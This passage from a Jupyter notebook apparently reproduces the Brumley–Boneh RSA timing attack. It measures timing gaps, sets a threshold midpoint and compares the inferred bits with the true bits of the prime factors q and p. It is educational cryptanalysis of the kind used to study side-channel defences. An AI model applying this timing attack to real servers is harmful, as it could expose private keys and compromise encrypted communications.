   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "T_g_low, T_g_high = learn_ith_bit_of_q(q_bits, 2, N, neighbourhood_size=400)\n",
    "zero_gaps.append(abs(T_g_low-T_g_high))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "([3620859], [617321])"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "one_gaps, zero_gaps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2119090.0"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "midpoint = (sum(one_gaps)/len(one_gaps) + sum(zero_gaps)/len(zero_gaps))/2\n",
    "midpoint"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So if a gap is below $midpoint$ this implies a value of 1, if its above $midpoint$ this implies a value of 0."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[768620,\n",
       " 2182199,\n",
       " 2324619,\n",
       " 269411,\n",
       " 1898177,\n",
       " 3076555,\n",
       " 2055003,\n",
       " 1270122,\n",
       " 2717880,\n",
       " 2028538,\n",
       " 4886555,\n",
       " 403202,\n",
       " 2126328,\n",
       " 360893,\n",
       " 5574948,\n",
       " 1522366,\n",
       " 3794700,\n",
       " 406081,\n",
       " 6665577,\n",
       " 1063060]"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "zero_one_gaps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 768620\n",
      "1 2182199\n",
      "0 2324619\n",
      "1 269411\n",
      "1 1898177\n",
      "0 3076555\n",
      "0 2055003\n",
      "0 1270122\n",
      "1 2717880\n",
      "1 2028538\n",
      "0 4886555\n",
      "0 403202\n",
      "1 2126328\n",
      "0 360893\n",
      "0 5574948\n",
      "0 1522366\n",
      "1 3794700\n",
      "0 406081\n",
      "0 6665577\n",
      "0 1063060\n"
     ]
    }
   ],
   "source": [
    "for i in range(0, 20):\n",
    "    print(correct_q_bits[i], zero_one_gaps[i])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 768620\n",
      "1 2182199\n",
      "0 2324619\n",
      "1 269411\n",
      "1 1898177\n",
      "1 3076555\n",
      "1 2055003\n",
      "1 1270122\n",
      "0 2717880\n",
      "1 2028538\n",
      "0 4886555\n",
      "0 403202\n",
      "0 2126328\n",
      "0 360893\n",
      "1 5574948\n",
      "0 1522366\n",
      "1 3794700\n",
      "1 406081\n",
      "0 6665577\n",
      "1 1063060\n"
     ]
    }
   ],
   "source": [
    "correct_p_bits = attack.sympy_integer_to_bits(p)\n",
    "for i in range(0, 20):\n",
    "    print(correct_p_bits[i], zero_one_gaps[i])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## References\n",
    "  - [1] https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
